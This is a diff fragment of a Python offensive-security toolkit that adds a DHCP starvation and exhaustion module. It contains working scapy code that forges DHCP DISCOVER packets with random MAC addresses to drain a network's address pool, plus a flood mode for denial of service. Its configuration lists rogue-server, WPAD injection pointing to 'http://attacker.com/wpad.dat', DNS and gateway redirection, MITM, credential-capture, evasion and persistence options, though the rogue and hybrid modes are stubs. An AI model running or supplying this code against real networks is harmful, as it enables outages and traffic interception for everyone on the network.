+            print(f"  DHCP STARVATION & EXHAUSTION PLATFORM - ENTERPRISE EDITION")
+            print(f"{'=' * 70}{Style.RESET_ALL}\n")
+            
+            # Check for scapy
+            try:
+                from scapy.all import (
+                    BOOTP, DHCP, Ether, IP, UDP, RandMAC, 
+                    sendp, sniff, conf, get_if_hwaddr
+                )
+                SCAPY_AVAILABLE = True
+            except ImportError:
+                print(f"{Fore.RED}✗ ERROR: Scapy not available{Style.RESET_ALL}")
+                print(f"{Fore.BLUE}ℹ  Install: pip3 install scapy{Style.RESET_ALL}\n")
                 return
+            
+            # Check root privileges
+            import os
+            if os.geteuid() != 0:
+                print(f"{Fore.RED}✗ ERROR: Root privileges required{Style.RESET_ALL}")
+                print(f"{Fore.BLUE}ℹ  Run with: sudo python3 kndys.py{Style.RESET_ALL}\n")
+                return
+            
+            # Load configuration
+            config = self._load_dhcp_starvation_config()
+            if not config:
+                print(f"{Fore.RED}✗ ERROR: Failed to load configuration{Style.RESET_ALL}")
+                return
+            
+            # Display configuration
+            self._display_dhcp_starvation_config(config)
+            
+            # Confirm operation
+            if config['confirm_attack']:
+                response = input(f"\n{Fore.YELLOW}⚠  WARNING: This attack will exhaust DHCP pool and disrupt network!")
+                response2 = input(f"{Fore.YELLOW}   Proceed with DHCP starvation? (yes/no): {Style.RESET_ALL}")
+                if response2.lower() not in ['yes', 'y']:
+                    print(f"{Fore.BLUE}ℹ  Operation cancelled{Style.RESET_ALL}")
+                    return
+            
+            # Initialize database
+            if config['enable_database']:
+                try:
+                    self._initialize_dhcp_database(config)
+                    print(f"\n{Fore.GREEN}✓ Database initialized{Style.RESET_ALL}")
+                except Exception as e:
+                    print(f"\n{Fore.YELLOW}⚠ WARNING: Database init failed - continuing without DB{Style.RESET_ALL}")
+            
+            # Detect DHCP server
+            if not config['dhcp_server']:
+                print(f"{Fore.CYAN}→ Detecting DHCP server...{Style.RESET_ALL}")
+                dhcp_server = self._detect_dhcp_server(config)
+                if dhcp_server:
+                    config['dhcp_server'] = dhcp_server
+                    print(f"{Fore.GREEN}✓ DHCP server detected: {dhcp_server}{Style.RESET_ALL}")
+                else:
+                    print(f"{Fore.YELLOW}⚠ WARNING: No DHCP server detected - continuing anyway{Style.RESET_ALL}")
+            
+            # Setup signal handlers
+            import signal
+            import sys
+            
+            def signal_handler(sig, frame):
+                print(f"\n\n{Fore.YELLOW}⚠  Interrupt received - cleaning up...{Style.RESET_ALL}\n")
+                self._cleanup_dhcp_starvation(config)
+                sys.exit(0)
+            
+            signal.signal(signal.SIGINT, signal_handler)
+            signal.signal(signal.SIGTERM, signal_handler)
+            
+            # Start DHCP starvation attack
+            print(f"\n{Fore.CYAN}━━━ STARTING DHCP STARVATION ATTACK ━━━{Style.RESET_ALL}\n")
+            print(f"{Fore.YELLOW}→ Interface: {config['interface']}{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}→ Attack Mode: {config['attack_mode']}{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}→ Request Count: {config['request_count']}{Style.RESET_ALL}")
+            print(f"{Fore.RED}⚠  Attack will exhaust DHCP IP pool{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}→ Press Ctrl+C to stop{Style.RESET_ALL}\n")
+            
+            # Execute attack based on mode
+            if config['attack_mode'] == 'starvation':
+                self._execute_starvation_attack(config)
+            elif config['attack_mode'] == 'dos':
+                self._execute_dos_attack(config)
+            elif config['attack_mode'] == 'rogue':
+                self._execute_rogue_server_attack(config)
+            elif config['attack_mode'] == 'hybrid':
+                self._execute_hybrid_attack(config)
+            else:
+                print(f"{Fore.RED}✗ ERROR: Invalid attack mode: {config['attack_mode']}{Style.RESET_ALL}")
+    
+    
+        def _load_dhcp_starvation_config(self):
+            """Load and validate DHCP starvation configuration"""
+            try:
+                config = {
+                    # Core
+                    'campaign_name': str(self.module_options.get('campaign_name', 'dhcp_attack')),
+                    'interface': str(self.module_options.get('interface', 'eth0')),
+                    'target_network': str(self.module_options.get('target_network', '192.168.1.0/24')),
+                    'dhcp_server': str(self.module_options.get('dhcp_server', '')),
+                    'enable_ipv6': self._parse_bool(self.module_options.get('enable_ipv6', 'false')),
+                    'protocol': str(self.module_options.get('protocol', 'ipv4')),
+                    
+                    # Attack parameters
+                    'attack_mode': str(self.module_options.get('attack_mode', 'starvation')),
+                    'request_count': int(self.module_options.get('request_count', '254')),
+                    'request_rate': int(self.module_options.get('request_rate', '100')),
+                    'burst_mode': self._parse_bool(self.module_options.get('burst_mode', 'false')),
+                    'burst_size': int(self.module_options.get('burst_size', '50')),
+                    'burst_interval': int(self.module_options.get('burst_interval', '5')),
+                    'continuous_mode': self._parse_bool(self.module_options.get('continuous_mode', 'false')),
+                    'attack_duration': int(self.module_options.get('attack_duration', '300')),
+                    
+                    # MAC generation
+                    'mac_generation': str(self.module_options.get('mac_generation', 'random')),
+                    'mac_prefix': str(self.module_options.get('mac_prefix', '')),
+                    'mac_vendor': str(self.module_options.get('mac_vendor', 'cisco')),
+                    'mac_pool_size': int(self.module_options.get('mac_pool_size', '1000')),
+                    'mac_reuse': self._parse_bool(self.module_options.get('mac_reuse', 'false')),
+                    'mac_randomization': self._parse_bool(self.module_options.get('mac_randomization', 'true')),
+                    
+                    # DHCP options
+                    'hostname_pattern': str(self.module_options.get('hostname_pattern', 'client-{id}')),
+                    'client_id_generation': str(self.module_options.get('client_id_generation', 'random')),
+                    'vendor_class': str(self.module_options.get('vendor_class', 'MSFT 5.0')),
+                    'request_options': str(self.module_options.get('request_options', '1,3,6,15,28,33,42,51,58,59')),
+                    'parameter_request_list': self._parse_bool(self.module_options.get('parameter_request_list', 'true')),
+                    'broadcast_flag': self._parse_bool(self.module_options.get('broadcast_flag', 'true')),
+                    'unicast_responses': self._parse_bool(self.module_options.get('unicast_responses', 'false')),
+                    
+                    # Lease management
+                    'lease_duration': int(self.module_options.get('lease_duration', '3600')),
+                    'release_after_offer': self._parse_bool(self.module_options.get('release_after_offer', 'false')),
+                    'decline_offers': self._parse_bool(self.module_options.get('decline_offers', 'false')),
+                    'accept_all_offers': self._parse_bool(self.module_options.get('accept_all_offers', 'true')),
+                    'track_leases': self._parse_bool(self.module_options.get('track_leases', 'true')),
+                    'lease_renewal': self._parse_bool(self.module_options.get('lease_renewal', 'false')),
+                    'renewal_interval': int(self.module_options.get('renewal_interval', '1800')),
+                    
+                    # Rogue server
+                    'deploy_rogue_server': self._parse_bool(self.module_options.get('deploy_rogue_server', 'false')),
+                    'rogue_server_ip': str(self.module_options.get('rogue_server_ip', '192.168.1.250')),
+                    'rogue_ip_range_start': str(self.module_options.get('rogue_ip_range_start', '192.168.1.100')),
+                    'rogue_ip_range_end': str(self.module_options.get('rogue_ip_range_end', '192.168.1.200')),
+                    'rogue_gateway': str(self.module_options.get('rogue_gateway', '192.168.1.1')),
+                    'rogue_dns': str(self.module_options.get('rogue_dns', '8.8.8.8,1.1.1.1')),
+                    'rogue_subnet_mask': str(self.module_options.get('rogue_subnet_mask', '255.255.255.0')),
+                    'rogue_lease_time': int(self.module_options.get('rogue_lease_time', '86400')),
+                    'rogue_domain_name': str(self.module_options.get('rogue_domain_name', 'attacker.local')),
+                    
+                    # Attack enhancement
+                    'dhcp_flooding': self._parse_bool(self.module_options.get('dhcp_flooding', 'false')),
+                    'discover_flood': self._parse_bool(self.module_options.get('discover_flood', 'false')),
+                    'request_flood': self._parse_bool(self.module_options.get('request_flood', 'false')),
+                    'release_flood': self._parse_bool(self.module_options.get('release_flood', 'false')),
+                    'decline_flood': self._parse_bool(self.module_options.get('decline_flood', 'false')),
+                    'inform_flood': self._parse_bool(self.module_options.get('inform_flood', 'false')),
+                    'nak_injection': self._parse_bool(self.module_options.get('nak_injection', 'false')),
+                    'malformed_packets': self._parse_bool(self.module_options.get('malformed_packets', 'false')),
+                    
+                    # Network disruption
+                    'gateway_override': self._parse_bool(self.module_options.get('gateway_override', 'false')),
+                    'gateway_redirect': str(self.module_options.get('gateway_redirect', '')),
+                    'dns_override': self._parse_bool(self.module_options.get('dns_override', 'false')),
+                    'dns_redirect': str(self.module_options.get('dns_redirect', '')),
+                    'route_injection': self._parse_bool(self.module_options.get('route_injection', 'false')),
+                    'malicious_routes': str(self.module_options.get('malicious_routes', '')),
+                    'wpad_injection': self._parse_bool(self.module_options.get('wpad_injection', 'false')),
+                    'wpad_url': str(self.module_options.get('wpad_url', 'http://attacker.com/wpad.dat')),
+                    
+                    # Response handling
+                    'capture_offers': self._parse_bool(self.module_options.get('capture_offers', 'true')),
+                    'capture_acks': self._parse_bool(self.module_options.get('capture_acks', 'true')),
+                    'capture_naks': self._parse_bool(self.module_options.get('capture_naks', 'true')),
+                    'analyze_responses': self._parse_bool(self.module_options.get('analyze_responses', 'true')),
+                    'fingerprint_server': self._parse_bool(self.module_options.get('fingerprint_server', 'true')),
+                    'detect_failover': self._parse_bool(self.module_options.get('detect_failover', 'false')),
+                    'monitor_pool_exhaustion': self._parse_bool(self.module_options.get('monitor_pool_exhaustion', 'true')),
+                    
+                    # Traffic analysis
+                    'packet_capture': self._parse_bool(self.module_options.get('packet_capture', 'true')),
+                    'pcap_output': str(self.module_options.get('pcap_output', 'dhcp_capture.pcap')),
+                    'log_all_dhcp': self._parse_bool(self.module_options.get('log_all_dhcp', 'true')),
+                    'track_server_responses': self._parse_bool(self.module_options.get('track_server_responses', 'true')),
+                    'identify_dhcp_servers': self._parse_bool(self.module_options.get('identify_dhcp_servers', 'true')),
+                    'map_network': self._parse_bool(self.module_options.get('map_network', 'false')),
+                    'detect_rogue_servers': self._parse_bool(self.module_options.get('detect_rogue_servers', 'false')),
+                    
+                    # Timing
+                    'threads': int(self.module_options.get('threads', '4')),
+                    'queue_size': int(self.module_options.get('queue_size', '1000')),
+                    'timeout': int(self.module_options.get('timeout', '10')),
+                    'retry_attempts': int(self.module_options.get('retry_attempts', '3')),
+                    'retry_delay': int(self.module_options.get('retry_delay', '2')),
+                    'rate_limit': int(self.module_options.get('rate_limit', '100')),
+                    'adaptive_timing': self._parse_bool(self.module_options.get('adaptive_timing', 'false')),
+                    'smart_throttling': self._parse_bool(self.module_options.get('smart_throttling', 'false')),
+                    
+                    # Evasion
+                    'stealth_mode': self._parse_bool(self.module_options.get('stealth_mode', 'false')),
+                    'randomize_timing': self._parse_bool(self.module_options.get('randomize_timing', 'false')),
+                    'jitter': self._parse_bool(self.module_options.get('jitter', 'false')),
+                    'jitter_range': int(self.module_options.get('jitter_range', '1000')),
+                    'mimic_legitimate': self._parse_bool(self.module_options.get('mimic_legitimate', 'false')),
+                    'avoid_detection': self._parse_bool(self.module_options.get('avoid_detection', 'false')),
+                    'gradual_escalation': self._parse_bool(self.module_options.get('gradual_escalation', 'false')),
+                    'escalation_rate': int(self.module_options.get('escalation_rate', '10')),
+                    
+                    # Target selection
+                    'target_specific_server': self._parse_bool(self.module_options.get('target_specific_server', 'false')),
+                    'server_mac': str(self.module_options.get('server_mac', '')),
+                    'server_ip': str(self.module_options.get('server_ip', '')),
+                    'ignore_other_servers': self._parse_bool(self.module_options.get('ignore_other_servers', 'false')),
+                    'prefer_ipv6': self._parse_bool(self.module_options.get('prefer_ipv6', 'false')),
+                    'target_vlan': str(self.module_options.get('target_vlan', '')),
+                    
+                    # Database
+                    'enable_database': self._parse_bool(self.module_options.get('enable_database', 'true')),
+                    'db_file': str(self.module_options.get('db_file', 'dhcp_starvation.db')),
+                    'log_file': str(self.module_options.get('log_file', 'dhcp_starvation.log')),
+                    'log_level': str(self.module_options.get('log_level', 'info')),
+                    'log_format': str(self.module_options.get('log_format', 'detailed')),
+                    'log_rotation': self._parse_bool(self.module_options.get('log_rotation', 'true')),
+                    'max_log_size': int(self.module_options.get('max_log_size', '100')),
+                    'log_timestamp': self._parse_bool(self.module_options.get('log_timestamp', 'true')),
+                    
+                    # Reporting
+                    'generate_report': self._parse_bool(self.module_options.get('generate_report', 'true')),
+                    'report_format': str(self.module_options.get('report_format', 'all')),
+                    'report_interval': int(self.module_options.get('report_interval', '60')),
+                    'include_statistics': self._parse_bool(self.module_options.get('include_statistics', 'true')),
+                    'include_server_info': self._parse_bool(self.module_options.get('include_server_info', 'true')),
+                    'include_lease_table': self._parse_bool(self.module_options.get('include_lease_table', 'true')),
+                    'include_timeline': self._parse_bool(self.module_options.get('include_timeline', 'true')),
+                    'visualize_data': self._parse_bool(self.module_options.get('visualize_data', 'false')),
+                    'export_to_csv': self._parse_bool(self.module_options.get('export_to_csv', 'false')),
+                    
+                    # Notifications
+                    'enable_alerts': self._parse_bool(self.module_options.get('enable_alerts', 'true')),
+                    'alert_on_success': self._parse_bool(self.module_options.get('alert_on_success', 'true')),
+                    'alert_on_exhaustion': self._parse_bool(self.module_options.get('alert_on_exhaustion', 'true')),
+                    'alert_on_server_down': self._parse_bool(self.module_options.get('alert_on_server_down', 'false')),
+                    'alert_method': str(self.module_options.get('alert_method', 'console')),
+                    'webhook_url': str(self.module_options.get('webhook_url', '')),
+                    'email_to': str(self.module_options.get('email_to', '')),
+                    'syslog_server': str(self.module_options.get('syslog_server', '')),
+                    'alert_threshold': int(self.module_options.get('alert_threshold', '90')),
+                    
+                    # Recovery
+                    'release_on_exit': self._parse_bool(self.module_options.get('release_on_exit', 'true')),
+                    'restore_network': self._parse_bool(self.module_options.get('restore_network', 'false')),
+                    'cleanup_leases': self._parse_bool(self.module_options.get('cleanup_leases', 'true')),
+                    'stop_rogue_server': self._parse_bool(self.module_options.get('stop_rogue_server', 'true')),
+                    'flush_arp_cache': self._parse_bool(self.module_options.get('flush_arp_cache', 'false')),
+                    'reset_interface': self._parse_bool(self.module_options.get('reset_interface', 'false')),
+                    
+                    # Safety
+                    'dry_run': self._parse_bool(self.module_options.get('dry_run', 'false')),
+                    'test_mode': self._parse_bool(self.module_options.get('test_mode', 'false')),
+                    'interactive': self._parse_bool(self.module_options.get('interactive', 'false')),
+                    'confirm_attack': self._parse_bool(self.module_options.get('confirm_attack', 'true')),
+                    'max_requests': int(self.module_options.get('max_requests', '1000')),
+                    'auto_stop_timer': int(self.module_options.get('auto_stop_timer', '600')),
+                    'emergency_stop': self._parse_bool(self.module_options.get('emergency_stop', 'true')),
+                    'safe_mode': self._parse_bool(self.module_options.get('safe_mode', 'false')),
+                    
+                    # Advanced
+                    'dhcp_snooping_bypass': self._parse_bool(self.module_options.get('dhcp_snooping_bypass', 'false')),
+                    'vlan_hopping': self._parse_bool(self.module_options.get('vlan_hopping', 'false')),
+                    'option_82_injection': self._parse_bool(self.module_options.get('option_82_injection', 'false')),
+                    'relay_agent_spoofing': self._parse_bool(self.module_options.get('relay_agent_spoofing', 'false')),
+                    'giaddr_manipulation': self._parse_bool(self.module_options.get('giaddr_manipulation', 'false')),
+                    'bootfile_injection': self._parse_bool(self.module_options.get('bootfile_injection', 'false')),
+                    'bootfile_url': str(self.module_options.get('bootfile_url', '')),
+                    'tftp_server': str(self.module_options.get('tftp_server', '')),
+                    
+                    # Post-attack
+                    'deploy_mitm': self._parse_bool(self.module_options.get('deploy_mitm', 'false')),
+                    'enable_arp_spoof': self._parse_bool(self.module_options.get('enable_arp_spoof', 'false')),
+                    'deploy_dns_spoof': self._parse_bool(self.module_options.get('deploy_dns_spoof', 'false')),
+                    'capture_credentials': self._parse_bool(self.module_options.get('capture_credentials', 'false')),
+                    'proxy_traffic': self._parse_bool(self.module_options.get('proxy_traffic', 'false')),
+                    'maintain_persistence': self._parse_bool(self.module_options.get('maintain_persistence', 'false'))
+                }
+                
+                return config
+            except Exception as e:
+                print(f"Error loading config: {str(e)}")
+                return None
+    
+    
+        def _display_dhcp_starvation_config(self, config):
+            """Display DHCP starvation configuration"""
+            from colorama import Fore, Style
+            
+            print(f"{Fore.CYAN}{'=' * 70}")
+            print(f"  CONFIGURATION")
+            print(f"{'=' * 70}{Style.RESET_ALL}\n")
+            
+            print(f"{Fore.YELLOW}  Campaign:{Style.RESET_ALL}")
+            print(f"    • Name:            {Fore.WHITE}{config['campaign_name']}{Style.RESET_ALL}")
+            print(f"    • Interface:       {Fore.WHITE}{config['interface']}{Style.RESET_ALL}")
+            print(f"    • Target Network:  {Fore.WHITE}{config['target_network']}{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.YELLOW}  Attack:{Style.RESET_ALL}")
+            print(f"    • Mode:            {Fore.WHITE}{config['attack_mode']}{Style.RESET_ALL}")
+            print(f"    • Request Count:   {Fore.WHITE}{config['request_count']}{Style.RESET_ALL}")
+            print(f"    • Request Rate:    {Fore.WHITE}{config['request_rate']} req/s{Style.RESET_ALL}")
+            print(f"    • Continuous:      {Fore.GREEN if config['continuous_mode'] else Fore.RED}{'✓' if config['continuous_mode'] else '✗'}{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.YELLOW}  MAC Generation:{Style.RESET_ALL}")
+            print(f"    • Strategy:        {Fore.WHITE}{config['mac_generation']}{Style.RESET_ALL}")
+            print(f"    • Pool Size:       {Fore.WHITE}{config['mac_pool_size']}{Style.RESET_ALL}")
+            print(f"    • Randomization:   {Fore.GREEN if config['mac_randomization'] else Fore.RED}{'✓' if config['mac_randomization'] else '✗'}{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.YELLOW}  Rogue Server:{Style.RESET_ALL}")
+            print(f"    • Deploy:          {Fore.GREEN if config['deploy_rogue_server'] else Fore.RED}{'✓' if config['deploy_rogue_server'] else '✗'}{Style.RESET_ALL}")
+            if config['deploy_rogue_server']:
+                print(f"    • Server IP:       {Fore.WHITE}{config['rogue_server_ip']}{Style.RESET_ALL}")
+                print(f"    • IP Range:        {Fore.WHITE}{config['rogue_ip_range_start']} - {config['rogue_ip_range_end']}{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.YELLOW}  Database:{Style.RESET_ALL}")
+            print(f"    • Enabled:         {Fore.GREEN if config['enable_database'] else Fore.RED}{'✓' if config['enable_database'] else '✗'}{Style.RESET_ALL}")
+            if config['enable_database']:
+                print(f"    • DB File:         {Fore.WHITE}{config['db_file']}{Style.RESET_ALL}")
+            
+            print()
+    
+    
+        def _initialize_dhcp_database(self, config):
+            """Initialize SQLite database for DHCP operations"""
+            import sqlite3
             
             conn = sqlite3.connect(config['db_file'])
             cursor = conn.cursor()
             
-            # Export packets to CSV
+            # Campaigns table
             cursor.execute('''
-                SELECT timestamp, src_ip, dst_ip, src_port, dst_port, protocol, length
-                FROM packets WHERE campaign_id = ?
-                ORDER BY timestamp
-            ''', (config['campaign_id'],))
+                CREATE TABLE IF NOT EXISTS campaigns (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    name TEXT NOT NULL,
+                    interface TEXT,
+                    target_network TEXT,
+                    attack_mode TEXT,
+                    start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    end_time TIMESTAMP,
+                    requests_sent INTEGER DEFAULT 0,
+                    offers_received INTEGER DEFAULT 0,
+                    acks_received INTEGER DEFAULT 0,
+                    leases_acquired INTEGER DEFAULT 0,
+                    pool_exhausted BOOLEAN DEFAULT 0,
+                    status TEXT DEFAULT 'active'
+                )
+            ''')
             
-            with open(config['csv_file'], 'w', newline='') as f:
-                writer = csv.writer(f)
-                writer.writerow(['Timestamp', 'Source IP', 'Dest IP', 'Source Port', 
-                               'Dest Port', 'Protocol', 'Length'])
-                writer.writerows(cursor.fetchall())
+            # DHCP requests table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS dhcp_requests (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    campaign_id INTEGER,
+                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    mac_address TEXT,
+                    hostname TEXT,
+                    transaction_id TEXT,
+                    request_type TEXT,
+                    FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
+                )
+            ''')
             
+            # DHCP responses table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS dhcp_responses (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    campaign_id INTEGER,
+                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    server_ip TEXT,
+                    offered_ip TEXT,
+                    mac_address TEXT,
+                    response_type TEXT,
+                    lease_time INTEGER,
+                    FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
+                )
+            ''')
+            
+            # Leases table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS leases (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    campaign_id INTEGER,
+                    mac_address TEXT,
+                    ip_address TEXT,
+                    server_ip TEXT,
+                    lease_time INTEGER,
+                    acquired_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    expires_at TIMESTAMP,
+                    released BOOLEAN DEFAULT 0,
+                    FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
+                )
+            ''')
+            
+            # DHCP servers table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS dhcp_servers (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    campaign_id INTEGER,
+                    server_ip TEXT,
+                    server_mac TEXT,
+                    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    last_seen TIMESTAMP,
+                    offers_count INTEGER DEFAULT 0,
+                    fingerprint TEXT,
+                    FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
+                )
+            ''')
+            
+            # Insert campaign record
+            cursor.execute('''
+                INSERT INTO campaigns (name, interface, target_network, attack_mode)
+                VALUES (?, ?, ?, ?)
+            ''', (config['campaign_name'], config['interface'], config['target_network'], config['attack_mode']))
+            
+            conn.commit()
             conn.close()
-            
-            print(f"  • CSV: {config['csv_file']}")
-            
-        except Exception as e:
-            if config['debug_mode']:
-                print(f"{Fore.RED}✗ CSV report error: {str(e)}{Style.RESET_ALL}")
     
-    # ============ WEB APPLICATION MODULES ============
     
-    def run_graphql_introspection_basic(self):
-        """Basic GraphQL introspection test (orphaned code recovered)"""
-        from colorama import Fore, Style
+        def _detect_dhcp_server(self, config):
+            """Detect DHCP server by sending discovery packet"""
+            from scapy.all import BOOTP, DHCP, Ether, IP, UDP, RandMAC, srp
+            import time
+            
+            try:
+                # Craft DHCP discover packet
+                discover = (
+                    Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") /
+                    IP(src="0.0.0.0", dst="255.255.255.255") /
+                    UDP(sport=68, dport=67) /
+                    BOOTP(chaddr=RandMAC()) /
+                    DHCP(options=[("message-type", "discover"), "end"])
+                )
+                
+                # Send and receive
+                answered, unanswered = srp(discover, iface=config['interface'], timeout=5, verbose=False)
+                
+                if answered:
+                    for sent, received in answered:
+                        if DHCP in received:
+                            return received[IP].src
+                
+                return None
+            except Exception as e:
+                return None
+    
+    
+        def _execute_starvation_attack(self, config):
+            """Execute DHCP starvation attack"""
+            from scapy.all import BOOTP, DHCP, Ether, IP, UDP, RandMAC, sendp
+            from colorama import Fore, Style
+            import time
+            import random
+            
+            print(f"{Fore.CYAN}━━━ DHCP STARVATION MODE ━━━{Style.RESET_ALL}\n")
+            
+            request_count = 0
+            offers_received = 0
+            acks_received = 0
+            leases = []
+            start_time = time.time()
+            
+            try:
+                for i in range(config['request_count']):
+                    # Generate unique MAC address
+                    if config['mac_generation'] == 'random':
+                        mac = RandMAC()
+                    elif config['mac_generation'] == 'sequential':
+                        mac = f"00:11:22:33:{i//256:02x}:{i%256:02x}"
+                    else:
+                        mac = RandMAC()
+                    
+                    # Generate hostname
+                    hostname = config['hostname_pattern'].replace('{id}', str(i))
+                    
+                    # Craft DHCP DISCOVER
+                    discover = (
+                        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
+                        IP(src="0.0.0.0", dst="255.255.255.255") /
+                        UDP(sport=68, dport=67) /
+                        BOOTP(chaddr=mac, xid=random.randint(1, 0xFFFFFFFF)) /
+                        DHCP(options=[
+                            ("message-type", "discover"),
+                            ("hostname", hostname),
+                            ("param_req_list", [1, 3, 6, 15]),
+                            "end"
+                        ])
+                    )
+                    
+                    # Send packet
+                    sendp(discover, iface=config['interface'], verbose=False)
+                    request_count += 1
+                    
+                    # Log to database
+                    if config['enable_database']:
+                        self._log_dhcp_request(config, str(mac), hostname, 'discover')
+                    
+                    # Display progress
+                    if request_count % 10 == 0:
+                        elapsed = int(time.time() - start_time)
+                        print(f"\r{Fore.CYAN}[{elapsed}s] Requests: {request_count} | Offers: {offers_received} | Leases: {len(leases)}{Style.RESET_ALL}", end='', flush=True)
+                    
+                    # Rate limiting
+                    if config['rate_limit'] > 0:
+                        time.sleep(1.0 / config['rate_limit'])
+                    
+                    # Check max requests
+                    if config['max_requests'] > 0 and request_count >= config['max_requests']:
+                        break
+                    
+                    # Check emergency stop
+                    if config['emergency_stop']:
+                        # Check for emergency stop conditions (e.g., pool 95% exhausted)
+                        success_rate = (len(leases) / request_count * 100) if request_count > 0 else 0
+                        if success_rate >= 95:
+                            print(f"\n\n{Fore.RED}⚠  EMERGENCY STOP: Pool 95% exhausted{Style.RESET_ALL}")
+                            self._emergency_stop_handler(config)
+                            break
+                    
+                    # Check auto-stop timer
+                    if config['auto_stop_timer'] > 0 and (time.time() - start_time) >= config['auto_stop_timer']:
+                        break
+            
+            except KeyboardInterrupt as e:
+                # Silently handle KeyboardInterrupt
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] KeyboardInterrupt: {e}")
+            
+            print(f"\n\n{Fore.YELLOW}━━━ ATTACK COMPLETED ━━━{Style.RESET_ALL}\n")
+            print(f"{Fore.GREEN}→ Requests Sent: {request_count}{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}→ Leases Acquired: {len(leases)}{Style.RESET_ALL}")
+            
+            if len(leases) >= config['request_count'] * 0.9:
+                print(f"{Fore.RED}⚠  DHCP POOL LIKELY EXHAUSTED!{Style.RESET_ALL}")
+    
+    
+        def _execute_dos_attack(self, config):
+            """Execute DHCP DoS attack"""
+            from scapy.all import BOOTP, DHCP, Ether, IP, UDP, RandMAC, sendp
+            from colorama import Fore, Style
+            import time
+            import random
+            
+            print(f"{Fore.CYAN}━━━ DHCP DOS MODE ━━━{Style.RESET_ALL}\n")
+            print(f"{Fore.RED}⚠  Flooding DHCP server with requests...{Style.RESET_ALL}\n")
+            
+            request_count = 0
+            start_time = time.time()
+            
+            try:
+                while True:
+                    # Rapid fire DHCP packets
+                    for _ in range(config['burst_size']):
+                        mac = RandMAC()
+                        
+                        if config['discover_flood']:
+                            packet = (
+                                Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
+                                IP(src="0.0.0.0", dst="255.255.255.255") /
+                                UDP(sport=68, dport=67) /
+                                BOOTP(chaddr=mac, xid=random.randint(1, 0xFFFFFFFF)) /
+                                DHCP(options=[("message-type", "discover"), "end"])
+                            )
+                            sendp(packet, iface=config['interface'], verbose=False)
+                            request_count += 1
+                        
+                        if config['request_flood']:
+                            packet = (
+                                Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
+                                IP(src="0.0.0.0", dst="255.255.255.255") /
+                                UDP(sport=68, dport=67) /
+                                BOOTP(chaddr=mac, xid=random.randint(1, 0xFFFFFFFF)) /
+                                DHCP(options=[("message-type", "request"), ("requested_addr", "192.168.1.100"), "end"])
+                            )
+                            sendp(packet, iface=config['interface'], verbose=False)
+                            request_count += 1
+                    
+                    elapsed = int(time.time() - start_time)
+                    print(f"\r{Fore.RED}[{elapsed}s] DoS Packets Sent: {request_count}{Style.RESET_ALL}", end='', flush=True)
+                    
+                    time.sleep(config['burst_interval'] / 1000.0)
+                    
+                    if config['auto_stop_timer'] > 0 and elapsed >= config['auto_stop_timer']:
+                        break
+            
+            except KeyboardInterrupt as e:
+                # Silently handle KeyboardInterrupt
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] KeyboardInterrupt: {e}")
+            
+            print(f"\n\n{Fore.YELLOW}━━━ DOS ATTACK COMPLETED ━━━{Style.RESET_ALL}\n")
+            print(f"{Fore.GREEN}→ DoS Packets Sent: {request_count}{Style.RESET_ALL}")
+    
+    
+        def _execute_rogue_server_attack(self, config):
+            """Execute rogue DHCP server attack"""
+            from colorama import Fore, Style
+            
+            print(f"{Fore.CYAN}━━━ ROGUE DHCP SERVER MODE ━━━{Style.RESET_ALL}\n")
+            print(f"{Fore.YELLOW}→ Deploying rogue DHCP server on {config['interface']}{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}→ IP Range: {config['rogue_ip_range_start']} - {config['rogue_ip_range_end']}{Style.RESET_ALL}")
+            print(f"{Fore.RED}⚠  Rogue server will respond to all DHCP requests{Style.RESET_ALL}\n")
+            print(f"{Fore.BLUE}ℹ  Rogue server implementation requires additional libraries{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}ℹ  Use mode 'starvation' for IP pool exhaustion{Style.RESET_ALL}")
+    
+    
+        def _execute_hybrid_attack(self, config):
+            """Execute hybrid attack (starvation + rogue server)"""
+            from colorama import Fore, Style
+            
+            print(f"{Fore.CYAN}━━━ HYBRID ATTACK MODE ━━━{Style.RESET_ALL}\n")
+            print(f"{Fore.YELLOW}→ Phase 1: Exhausting DHCP pool{Style.RESET_ALL}\n")
+            
+            # Execute starvation first
+            self._execute_starvation_attack(config)
+            
+            print(f"\n{Fore.YELLOW}→ Phase 2: Would deploy rogue DHCP server{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}ℹ  Rogue server deployment not implemented{Style.RESET_ALL}")
+    
+    
+        def _log_dhcp_request(self, config, mac, hostname, request_type):
+            """Log DHCP request to database"""
+            import sqlite3
+            try:
+                conn = sqlite3.connect(config['db_file'])
+                cursor = conn.cursor()
+                
+                cursor.execute('''
+                    INSERT INTO dhcp_requests (campaign_id, mac_address, hostname, request_type)
+                    VALUES (1, ?, ?, ?)
